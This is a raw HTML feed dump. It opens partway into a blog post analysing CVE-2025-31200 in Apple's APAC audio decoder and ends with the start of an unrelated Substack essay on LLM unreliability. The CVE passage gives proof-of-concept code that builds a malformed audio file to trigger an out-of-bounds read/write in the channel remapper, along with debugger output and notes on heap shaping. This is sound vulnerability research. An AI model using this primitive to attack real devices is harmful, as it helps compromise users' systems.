</span></span><span><span> 4</span><span>  <span>config</span><span>-&gt;</span><span>remappingChannelLayout</span><span>-&gt;</span><span>mChannelLayoutTag</span> <span>=</span> <span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>0x8</span><span>;</span> <span>// Create the mismatch without triggering the error in GlobalConfig
</span></span></span><span><span> 5</span><span><span></span>	<span>config</span><span>-&gt;</span><span>m_RemappingArray</span><span>.</span><span>push_back</span><span>(</span><span>0xff</span><span>);</span> <span>// Again it doesn't seem like this value actually gets read in to the m_RemappingArray, but we do need to initialize it,
</span></span></span><span><span> 6</span><span><span></span>	<span>// Otherwise serialize segfaults.
</span></span></span><span><span> 7</span><span><span></span><span>}</span>
</span></span><span><span> 8</span><span>
</span></span><span><span> 9</span><span><span>int</span> <span>main</span><span>()</span> <span>{</span>
</span></span><span><span>10</span><span>  <span>uint32_t</span> <span>channelNum</span> <span>=</span> <span>1</span><span>;</span>
</span></span><span><span>11</span><span>  <span>AVAudioFormat</span><span>*</span> <span>formatIn</span> <span>=</span> <span>[[</span><span>AVAudioFormat</span> <span>alloc</span><span>]</span> <span>initStandardFormatWithSampleRate</span><span>:</span><span>44100</span>
</span></span><span><span>12</span><span>                                                                           <span>channels</span><span>:</span><span>channelNum</span><span>];</span>
</span></span><span><span>13</span><span>  <span>AudioStreamBasicDescription</span> <span>outputDescription</span><span>{.</span><span>mSampleRate</span> <span>=</span> <span>44100</span><span>,</span>
</span></span><span><span>14</span><span>                                                <span>.</span><span>mFormatID</span> <span>=</span> <span>kAudioFormatAPAC</span><span>,</span>
</span></span><span><span>15</span><span>                                                <span>.</span><span>mFormatFlags</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span>16</span><span>                                                <span>.</span><span>mBytesPerPacket</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span>17</span><span>                                                <span>.</span><span>mFramesPerPacket</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span>18</span><span>                                                <span>.</span><span>mBytesPerFrame</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span>19</span><span>                                                <span>.</span><span>mChannelsPerFrame</span> <span>=</span> <span>channelNum</span><span>,</span>
</span></span><span><span>20</span><span>                                                <span>.</span><span>mBitsPerChannel</span> <span>=</span> <span>0</span><span>,</span>
</span></span><span><span>21</span><span>                                                <span>.</span><span>mReserved</span> <span>=</span> <span>0</span><span>};</span>
</span></span><span><span>22</span><span>  <span>AVAudioChannelLayout</span><span>*</span> <span>channelLayout</span> <span>=</span>
</span></span><span><span>23</span><span>      <span>[</span><span>AVAudioChannelLayout</span> <span>layoutWithLayoutTag</span><span>:</span><span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>channelNum</span><span>];</span>
</span></span><span><span>24</span><span>
</span></span><span><span>25</span><span>  <span>NSURL</span><span>*</span> <span>outUrl</span> <span>=</span> <span>[</span><span>NSURL</span> <span>fileURLWithPath</span><span>:</span><span>@</span><span>"output.mp4"</span><span>];</span>
</span></span><span><span>26</span><span>
</span></span><span><span>27</span><span>  <span>OSStatus</span> <span>status</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span>28</span><span>
</span></span><span><span>29</span><span>  <span>ExtAudioFileRef</span> <span>audioFile</span> <span>=</span> <span>nullptr</span><span>;</span>
</span></span><span><span>30</span><span>  
</span></span><span><span>31</span><span>  <span>ExtAudioFileCreateWithURL</span><span>((</span><span>__bridge</span> <span>CFURLRef</span><span>)</span><span>outUrl</span><span>,</span> <span>kAudioFileMPEG4Type</span><span>,</span> <span>&amp;</span><span>outputDescription</span><span>,</span>
</span></span><span><span>32</span><span>                                <span>channelLayout</span><span>.</span><span>layout</span><span>,</span> <span>kAudioFileFlags_EraseFile</span><span>,</span> <span>&amp;</span><span>audioFile</span><span>);</span>
</span></span><span><span>33</span><span>
</span></span><span><span>34</span><span>  <span>ExtAudioFileSetProperty</span><span>(</span><span>audioFile</span><span>,</span> <span>kExtAudioFileProperty_ClientDataFormat</span><span>,</span>
</span></span><span><span>35</span><span>                                   <span>sizeof</span><span>(</span><span>AudioStreamBasicDescription</span><span>),</span> <span>formatIn</span><span>.</span><span>streamDescription</span><span>);</span>
</span></span><span><span>36</span><span>  <span>ExtAudioFileSetProperty</span><span>(</span><span>audioFile</span><span>,</span> <span>kExtAudioFileProperty_ClientChannelLayout</span><span>,</span>
</span></span><span><span>37</span><span>                                   <span>sizeof</span><span>(</span><span>AudioChannelLayout</span><span>),</span> <span>formatIn</span><span>.</span><span>channelLayout</span><span>.</span><span>layout</span><span>);</span>
</span></span><span><span>38</span><span>                                   
</span></span><span><span>39</span><span>  <span>float</span> <span>audioBuffer</span><span>[</span><span>44100</span><span>]</span> <span>=</span> <span>{};</span>
</span></span><span><span>40</span><span>  <span>AudioBufferList</span> <span>audioBufferList</span><span>{</span>
</span></span><span><span>41</span><span>      <span>.</span><span>mNumberBuffers</span> <span>=</span> <span>1</span><span>,</span>
</span></span><span><span>42</span><span>      <span>.</span><span>mBuffers</span> <span>=</span>
</span></span><span><span>43</span><span>          <span>{</span>
</span></span><span><span>44</span><span>              <span>{</span>
</span></span><span><span>45</span><span>                  <span>.</span><span>mNumberChannels</span> <span>=</span> <span>1</span><span>,</span>
</span></span><span><span>46</span><span>                  <span>.</span><span>mDataByteSize</span> <span>=</span> <span>sizeof</span><span>(</span><span>audioBuffer</span><span>),</span>
</span></span><span><span>47</span><span>                  <span>.</span><span>mData</span> <span>=</span> <span>audioBuffer</span><span>,</span>
</span></span><span><span>48</span><span>              <span>},</span>
</span></span><span><span>49</span><span>          <span>},</span>
</span></span><span><span>50</span><span>  <span>};</span>
</span></span><span><span>51</span><span>  
</span></span><span><span>52</span><span>  <span>ExtAudioFileWrite</span><span>(</span><span>audioFile</span><span>,</span> <span>sizeof</span><span>(</span><span>audioBuffer</span><span>)</span> <span>/</span> <span>sizeof</span><span>(</span><span>audioBuffer</span><span>[</span><span>0</span><span>]),</span> <span>&amp;</span><span>audioBufferList</span><span>);</span>
</span></span><span><span>53</span><span>
</span></span><span><span>54</span><span>  <span>ExtAudioFileDispose</span><span>(</span><span>audioFile</span><span>);</span>
</span></span><span><span>55</span><span>
</span></span><span><span>56</span><span>  <span>audioFile</span> <span>=</span> <span>nullptr</span><span>;</span>
</span></span><span><span>57</span><span>  <span>return</span> <span>0</span><span>;</span>
</span></span><span><span>58</span><span><span>}</span></span></span></code></pre></div><p>By creating the audio file this way, Apple‚Äôs encoder sets the number of total components to 1, but then by modifying the <code>m_ChannelLayoutTag</code> during <code>apac::hoa::CodecConfig::Serialize</code> we force the serializer to create the mismatch. There are only certain profiles that are supported, as discussed above, so the number of channels in the channel layout tag has to be one of the supported profiles.</p>
<p>The crash occured most often as a null pointer dereference in <code>apac::HOADecoder::DecodeAPACFrame</code>. <code>x26</code> here hasn‚Äôt yet been initialized:</p>





<p>so we crash with EXC_BAD_ACCESS (code=1, address=0x19). If we enable Guard Malloc in Xcode then we can see the first invalid read occurs in <code>APAC::ChannelRemapper::Process</code>.</p>
<p><img alt="Guard Malloc showing invalid read" src="https://blog.noahhw.dev/posts/cve-2025-31200/images/guardmalloc.png"></p>
<p>Image courtesy of Zhouwei</p>
<p>If we look at the assembly where the invalid read occurs its clear that it is trying to read some value from an array, and x8 + x11¬´3 points out of bounds. This of course, all makes perfect sense. The method is called <code>APACChannelRemapper::Process</code>. This must be where the channel remapping actually occurs. The instruction directly above the one that Guard Malloc catches, also tells us a lot about what is going on:</p>





<div><pre tabindex="0"><code data-lang="armasm"><span><span>1</span><span>ldr <span>x8</span>, <span>[</span><span>x1</span><span>]</span>
</span></span><span><span>2</span><span>ldr <span>x9</span>, <span>[</span><span>x8</span>, <span>x11</span>, <span>lsl</span> #<span>3</span><span>]</span></span></span></code></pre></div><p>x1, which, given Arm calling conventions is most likely argument two, is a pointer to some kind of vector of pointers. Taking a look in Binary Ninja, this method is relatively straightforward. It essentially takes two input paramaters: a pointer to <code>this</code>, an <code>ApacChannelRemapper</code> and a pointer to a <code>std::vector&lt;float*&gt;</code>:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span>1</span><span><span>struct</span> <span>ApacChannelRemapper</span> <span>{</span>
</span></span><span><span>2</span><span>	<span>struct</span> <span>_vtable_for_ApacChannelRemapper</span><span>*</span> <span>vtable</span><span>;</span>
</span></span><span><span>3</span><span>	<span>uint8_t</span><span>*</span> <span>remapStart</span><span>;</span> 
</span></span><span><span>4</span><span>	<span>uint8_t</span><span>*</span> <span>remapEnd</span><span>;</span>
</span></span><span><span>5</span><span><span>};</span>
</span></span><span><span>6</span><span>
</span></span><span><span>7</span><span><span>std</span><span>::</span><span>vector</span><span>&lt;</span><span>float</span><span>*&gt;</span> <span>channelBuffer</span><span>;</span></span></span></code></pre></div><p>I took a look at runtime at function entry, and it turns out that the <code>ApacChannelRemapper</code> object contains the <code>m_RemappingArray</code> from earlier:</p>





<pre tabindex="0"><code>(lldb) mem read --count `*(uint64_t*)($x0+0x10)-*(uint64_t*)($x0+0x8)` --format hex --size 1 -- *(uint64_t*)($x0+0x8) 
0x600003674910: 0x00 0x00 0x03 0x00 0x00 0x00 0x06 0x00</code></pre><p>We read in size 1 since the <code>m_RemappingArray</code> is an array of bytes. On the other hand, the vector that gets passed as the second argument is a vector of pointers to floats. We can read the size:</p>





<pre tabindex="0"><code>(lldb)  p (*(uint64_t*)($x1+0x8)-*(uint64_t*)($x1))/8
(uint64_t) 1</code></pre><p>That is the mismatch! The <code>m_RemappingArray</code> has the size we forced it to have by hijacking the serialization of the <code>m_ChannelLayoutTag</code> whereas the actual float buffer being passed in argument 2 only has <code>m_TotalComponents</code> elements. It is worth understanding exactly what this remapping function does, as that will make it clearer how to write what we want, where we want. It‚Äôs fairly simple:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span> 1</span><span><span>int</span> <span>APACChannelRemapper</span><span>::</span><span>Process</span><span>(</span><span>struct</span> <span>remapper</span> <span>*</span><span>remapVec</span><span>,</span> <span>float</span><span>**</span> <span>floatVec</span><span>)</span> <span>{</span>
</span></span><span><span> 2</span><span>
</span></span><span><span> 3</span><span>    <span>if</span> <span>(</span><span>remapStartAddr</span> <span>==</span> <span>remapEndAddr</span><span>)</span> <span>{</span>
</span></span><span><span> 4</span><span>        <span>return</span> <span>0</span><span>;</span> <span>// No remapping to do
</span></span></span><span><span> 5</span><span><span></span>    <span>}</span>
</span></span><span><span> 6</span><span>    <span>uint64_t</span> <span>outerIdx</span> <span>=</span> <span>0</span><span>;</span> 
</span></span><span><span> 7</span><span>    <span>uint64_t</span> <span>remapStartIndex</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span> 8</span><span>    <span>uint64_t</span> <span>index</span> <span>=</span> <span>0</span><span>;</span>
</span></span><span><span> 9</span><span>    
</span></span><span><span>10</span><span>    <span>while</span> <span>(</span><span>outerIdx</span> <span>&lt;</span> <span>remapVec</span><span>-&gt;</span><span>size</span><span>)</span> <span>{</span>
</span></span><span><span>11</span><span>        <span>index</span> <span>=</span> <span>outerIdx</span><span>;</span>
</span></span><span><span>12</span><span>
</span></span><span><span>13</span><span>        <span>while</span> <span>(</span><span>remapVec</span><span>[</span><span>remapStartIndex</span><span>]</span> <span>&gt;=</span> <span>index</span><span>)</span> <span>{</span> <span>// Follow the 'cycle'
</span></span></span><span><span>14</span><span><span></span>            <span>index</span> <span>=</span> <span>remapVec</span><span>[</span><span>remapStartIndex</span><span>];</span> 
</span></span><span><span>15</span><span>        <span>}</span>
</span></span><span><span>16</span><span>        <span>if</span> <span>(</span><span>remapVec</span><span>[</span><span>remapStartIndex</span><span>]</span> <span>!=</span> <span>index</span><span>)</span> <span>{</span> <span>// We found an entry that is a 'good swap'
</span></span></span><span><span>17</span><span><span></span>            <span>float</span><span>*</span> <span>swapone</span> <span>=</span> <span>floatVec</span><span>[</span><span>index</span><span>];</span> 
</span></span><span><span>18</span><span>            <span>float</span><span>*</span> <span>swaptwo</span> <span>=</span> <span>floatVec</span><span>[</span><span>remapVec</span><span>[</span><span>remapStartIndex</span><span>]];</span>
</span></span><span><span>19</span><span>            <span>floatVec</span><span>[</span><span>index</span><span>]</span> <span>=</span> <span>swaptwo</span><span>;</span> 
</span></span><span><span>20</span><span>            <span>floatVec</span><span>[</span><span>remapVec</span><span>[</span><span>remapStartIndex</span><span>]]</span> <span>=</span> <span>swapone</span><span>;</span>
</span></span><span><span>21</span><span>        <span>}</span>
</span></span><span><span>22</span><span>        <span>outerIdx</span><span>++</span><span>;</span>
</span></span><span><span>23</span><span>    <span>}</span>
</span></span><span><span>24</span><span>    <span>return</span> <span>0</span><span>;</span>
</span></span><span><span>25</span><span><span>}</span></span></span></code></pre></div><p>Maybe it‚Äôs telling of my computer science fundamentals, but I had never seen this idea before. Apparently you can permute a vector according to some desired layout in constant space with the method above.</p>
<p>Essentially, if you have a vector, say [A,B,C] that you actually want to be [B,A,C], then you might do that with a ‚Äòpermutation map‚Äô: another vector that says where each element should go. In this case that would be [1,0,2], which means that the element at index 1 should go to index 0, and the element at index 0 should go to index 1 and the element at index 2 should stay where it is.  The simplest working way to do this is to just allocate another vector, and essentially use the permutation map as a kind of dictionary (index‚Üíelement) for populating that third vector. However, if you would rather be clever and don‚Äôt feel like allocating a whole other vector, then you can use the algorithm above.</p>
<p>For us this means that the input remapping is a map that we can use to read and write out of bounds. Notice that both <code>remapVec</code> and the input <code>floatVec</code> are assumed to be ‚Äòwell-behaved‚Äô in their own way? If, for example, the <code>remapVec</code> looked like this [1,2,3], then the inner while loop would happily read in memory from out of bounds. Given that this function is executed under the condition that we created earlier where the <code>remapVec</code> is larger than the actual <code>floatVec</code>, then there can be elements in <code>remapVec</code> that are larger than the size of <code>floatVec</code>, each of which will cause a ‚Äòswap‚Äô with some memory from out bounds. This is the illegal read we saw earlier under Guard Malloc. Similarly though, for every read that gets written into the remapping array during this function, there is an equivalent write. This is the primitive.</p>
<p>As it stands though, the float pointers being swapped from out of bounds are being swapped almost always with zeros (though it depends on the specific heap layout), and then quickly dereferenced, hence the segfault. If we want it not to segfault then we need to understand a few things in more detail:</p>
<ol>
<li>The <code>m_RemappingArray</code> and how to control it</li>
<li>The heap layout around the float vector</li>
<li>The control flow following the <code>APACChannelRemapper::Process</code> method</li>
</ol>
<p>In order to turn this into a real arbitrary write, we would, I think, need to understand much more deeply where in the actual audio processing pipeline this method happens. <em>This would be a great investigation if somebody wants to look into it</em>. I have found that the float vectors are clearly related to the audio data per frame. It seems that the heap layout is affected by the number of channels we pick (since of course this changes the size of the remapping array), and I have found that if I pick a number for the number of channels that is only slightly smaller than the number given in the layout tag:</p>





<div><pre tabindex="0"><code data-lang="cpp"><span><span> 1</span><span>
</span></span><span><span> 2</span><span><span>void</span> <span>PatchCodecConfig</span><span>(</span><span>CodecConfig</span><span>*</span> <span>config</span><span>)</span> <span>{</span>
</span></span><span><span> 3</span><span>    <span>uint32_t</span> <span>num_channels</span> <span>=</span> <span>13</span><span>;</span>
</span></span><span><span> 4</span><span>    <span>config</span><span>-&gt;</span><span>remappingChannelLayout</span><span>-&gt;</span><span>mChannelLayoutTag</span> <span>=</span> <span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>num_channels</span><span>;</span>
</span></span><span><span> 5</span><span>    <span>config</span><span>-&gt;</span><span>m_RemappingArray</span><span>.</span><span>push_back</span><span>(</span><span>0x3</span><span>);</span>
</span></span><span><span> 6</span><span><span>}</span>
</span></span><span><span> 7</span><span>
</span></span><span><span> 8</span><span><span>int</span> <span>main</span><span>()</span> <span>{</span>
</span></span><span><span> 9</span><span>    <span>uint32_t</span> <span>channelNum</span> <span>=</span> <span>12</span><span>;</span>
</span></span><span><span>10</span><span>    <span>AVAudioChannelLayout</span><span>*</span> <span>channelLayout</span> <span>=</span>
</span></span><span><span>11</span><span>        <span>[</span><span>AVAudioChannelLayout</span> <span>layoutWithLayoutTag</span><span>:</span><span>kAudioChannelLayoutTag_HOA_ACN_SN3D</span> <span>|</span> <span>channelNum</span><span>];</span>
</span></span><span><span>12</span><span>
</span></span><span><span>13</span><span>    <span>AVAudioFormat</span><span>*</span> <span>formatIn</span> <span>=</span> <span>[[</span><span>AVAudioFormat</span> <span>alloc</span><span>]</span> <span>initWithCommonFormat</span><span>:</span><span>AVAudioPCMFormatInt32</span>
</span></span><span><span>14</span><span>                                                              <span>sampleRate</span><span>:</span><span>44100</span>
</span></span><span><span>15</span><span>                                                             <span>interleaved</span><span>:</span><span>YES</span> <span>//ensure that we mark the channels as interleaved
</span></span></span><span><span>16</span><span><span></span>                                                            <span>channelLayout</span><span>:</span><span>channelLayout</span><span>];</span>
</span></span><span><span>17</span><span><span>}</span></span></span></code></pre></div><p>then that creates a situation where there are actually valid pointers that can be dereferenced later as floats without causing a null pointer dereference. In this case, it only crashes much later (if at all) due to actual heap corruption.</p>
<p>If we fill the frame buffers with different data, then the address reported in the segfault changes in proportion to the values we pick, so there is some control over the write doing this. It‚Äôs still unclear to me at this point what exact stage of the processing pipeline the frame data is in. If we knew, then perhaps we could write an arbitrary value into a (seemingly) arbitary location in memory.</p>
<p>Although, it is possible that the primitive here is fundamentally tied to how these floats are being manipulated at this point. For example, this code might be applying some series of audio processing related functions to our input values that make it so they are always basically always going to be unwieldy to work with. Imagine if the primitive is that you can write n 8 byte sequences out of bounds, but they must be valid 32 bit floats in the range x-y, that had to return valid sequences when passed through however many audio processing functions. That would really constrain the space of what could be written out of bounds.</p>
<p>Of course, we know that this was actively exploited in the wild, and there have been exploits that did a lot more with a lot less. Still, I am curious to see how this is pushed to full code execution. At this point though, I have done what I set out to do: understand CVE-2025-31200, and I want to get this out so that other people can take a look as well.</p>
<p>Some folks have already reached out to me saying that they think they may have found how to push it further, so look out for anything from them. I may put out a part two to this with more details on how the exploit actually would have worked (for example the chain from this to the RPAC bug). Normally, it isn‚Äôt necessarily the actual exploit primitive that is the center of the story, but I think in this case it was a really interesting example of how tricky some of these bugs can be. Hopefully this investigation will be useful to others who want to do a similar kind of thing. I‚Äôm sure if you had a deep understand of Apples audio-processing pipeline (or probably computational audio in general) then it wouldn‚Äôt be too too difficult to find something like this, but the venn diagram of such people and people with enough knowledge to know how to look for these bugs is not particularly huge. That makes this attack surface quite a rich one!</p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Unreliability of LLMs and What Lies Ahead (125 pts)]]></title>
            <link>https://verissimo.substack.com/p/verissimo-monthly-may-2025</link>
            <guid>44160573</guid>
            <pubDate>Mon, 02 Jun 2025 16:36:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://verissimo.substack.com/p/verissimo-monthly-may-2025">https://verissimo.substack.com/p/verissimo-monthly-may-2025</a>, See on <a href="https://news.ycombinator.com/item?id=44160573">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa062ae34-9b1c-488c-bda5-0ec2549cc854_1456x600.heic" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa062ae34-9b1c-488c-bda5-0ec2549cc854_1456x600.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa062ae34-9b1c-488c-bda5-0ec2549cc854_1456x600.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa062ae34-9b1c-488c-bda5-0ec2549cc854_1456x600.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa062ae34-9b1c-488c-bda5-0ec2549cc854_1456x600.heic 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa062ae34-9b1c-488c-bda5-0ec2549cc854_1456x600.heic" width="409" height="168.54395604395606" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/a062ae34-9b1c-488c-bda5-0ec2549cc854_1456x600.heic&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:600,&quot;width&quot;:1456,&quot;resizeWidth&quot;:409,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa062ae34-9b1c-488c-bda5-0ec2549cc854_1456x600.heic 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa062ae34-9b1c-488c-bda5-0ec2549cc854_1456x600.heic 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa062ae34-9b1c-488c-bda5-0ec2549cc854_1456x600.heic 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa062ae34-9b1c-488c-bda5-0ec2549cc854_1456x600.heic 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p><span>It‚Äôs been a big week in AI. Google, OpenAI, and Anthropic all had major releases, and one clear throughline was the push toward </span><strong>increasingly autonomous coding agents</strong><span>. So we figured this was the perfect moment to talk about </span><strong>how</strong><span> </span><strong>unreliable Large Language Models (LLMs)</strong><span> </span><strong>are as a base technology</strong><span>, and </span><strong>what that means for builders</strong><span> trying to work with them.</span></p><p><span>Unreliability is the core bottleneck to unlocking the full power of LLMs. For all the deserved excitement around LLMs, most users still engage with them only </span><a href="https://www.ben-evans.com/benedictevans/2025/5/25/genais-adoption-puzzle" rel="">occasionally</a><span>. Daily active use remains comparatively low. You could read that as limited utility or slow dispersion, but we think a major contributor is unreliability. When a system can‚Äôt be trusted to work consistently, its real-world utility collapses. It‚Äôs no coincidence that the clearest value from LLMs so far has come from code generation, where outputs are not only useful, but highly verifiable. You can run the code, test it, compile it. It either works or it doesn‚Äôt. And the product it supports‚Äîsoftware‚Äîis deterministic by design. </span></p><p>This piece explores:</p><ul><li><p><strong>The core challenge:</strong><span> LLMs are fundamentally unreliable, a characteristic we believe is unlikely to change soon.</span></p></li><li><p><strong>Implications for builders:</strong><span> Success in building AI-powered products doesn‚Äôt come from waiting for perfect models, but rather from from building around their inherent variance.</span></p></li><li><p><strong>Framework:</strong><span> We outline four distinct approaches builders can take to manage variance. We'll map the core characteristics of each, offering a clearer lens for assessing whether a given team's capabilities and chosen strategy align.</span></p></li></ul><p><span>We‚Äôve spent the past few years closely tracking the LLM space, following the research, watching how companies are deploying them, how users interact with them, and using the models extensively ourselves. These observations have made one thing abundantly clear: large language models are </span><strong>fundamentally unreliable</strong><span>.</span></p><ul><li><p>Their outputs often deviate significantly from the intended result.</p><ul><li><p>This unreliability is persistent. It might be low in some cases, but it never fully disappears, and it‚Äôs largely unpredictable ahead of time.</p></li><li><p><span>Even in the most constrained, well-defined tasks, LLM behavior</span><strong> is not deterministic. </strong></p></li></ul></li><li><p>Crucially, when LLMs are asked to perform tasks that involve any kind of real agency‚Äîmulti-step actions, tool use, autonomy‚Äîthese reliability issues get far worse. Failure rates spike to levels that make these systems unusable in real-world scenarios.</p></li><li><p>We believe these core reliability dynamics of LLMs aren‚Äôt likely to change meaningfully in the short to medium term.</p></li></ul><ol><li><p><strong>LLMs hallucinate</strong><span>‚Äîthat is, they generate incorrect outputs. The most </span><a href="https://crfm.stanford.edu/helm/lite/v1.13.0/#/leaderboard" rel="">reputable </a><span>benchmarks we have, including those </span><a href="https://openai.com/index/introducing-simpleqa/" rel="">used</a><span> by leading labs in their model cards, indicate that baseline hallucination rates, in scenarios where the model relies on its ‚Äúown memory‚Äù (a useful proxy for many real-world failure modes), are around </span><strong>50% even for the best models</strong><span>. </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F23e52d42-f248-443f-857d-d95bb9e67da4_643x158.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F23e52d42-f248-443f-857d-d95bb9e67da4_643x158.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F23e52d42-f248-443f-857d-d95bb9e67da4_643x158.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F23e52d42-f248-443f-857d-d95bb9e67da4_643x158.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F23e52d42-f248-443f-857d-d95bb9e67da4_643x158.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F23e52d42-f248-443f-857d-d95bb9e67da4_643x158.png" width="643" height="158" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/23e52d42-f248-443f-857d-d95bb9e67da4_643x158.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:158,&quot;width&quot;:643,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false,&quot;align&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F23e52d42-f248-443f-857d-d95bb9e67da4_643x158.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F23e52d42-f248-443f-857d-d95bb9e67da4_643x158.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F23e52d42-f248-443f-857d-d95bb9e67da4_643x158.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F23e52d42-f248-443f-857d-d95bb9e67da4_643x158.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><ol><li><p><span>There are narrow usage patterns, e.g., when the answer is explicitly included in the prompt where error </span><a href="https://www.nature.com/articles/s41746-025-01670-7" rel="">rates </a><a href="https://github.com/lechmazur/confabulations/" rel="">can</a><span> </span><a href="https://huggingface.co/spaces/vectara/leaderboard" rel="">drop</a><span> to ~1%, but this is fragile: these rates are </span><a href="https://crfm.stanford.edu/helm/lite/v1.13.0/#/leaderboard" rel="">heavily</a><span> </span><a href="https://research.aimultiple.com/ai-hallucination/" rel="">dependent</a><span> on </span><a href="https://royalsocietypublishing.org/doi/10.1098/rsos.241776" rel="">the type</a><span> of question, and even then, it still falls well short of software-grade reliability. </span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F463fb0b9-1521-458c-a488-081546b0a15b_935x289.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F463fb0b9-1521-458c-a488-081546b0a15b_935x289.png 424w, 